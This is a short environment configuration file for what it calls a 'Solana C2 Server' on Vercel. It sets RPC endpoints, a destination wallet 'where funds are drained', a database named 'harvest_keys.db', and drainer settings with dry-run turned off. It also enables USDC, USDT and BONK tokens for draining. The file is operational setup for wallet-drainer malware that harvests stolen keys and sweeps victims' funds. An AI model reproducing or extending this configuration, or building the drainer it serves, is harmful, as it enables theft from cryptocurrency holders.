# Solana C2 Server Environment for Vercel

# RPC Endpoints (primary/backup)
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
SOLANA_RPC_URL_BACKUP=https://api.helius.xyz/v0

# Destination wallet (where funds are drained)
TARGET_WALLET=YourDestinationWalletPubkeyHere

# Database (SQLite auto-inits on first request)
DB_PATH=harvest_keys.db

# Drainer settings
DRY_RUN=false
MAX_RETRIES=3
DRAINER_POLL_INTERVAL=5

# SPL Token mints (default enabled for drain)
SPL_USDC=true
SPL_USDT=true
SPL_BONK=true
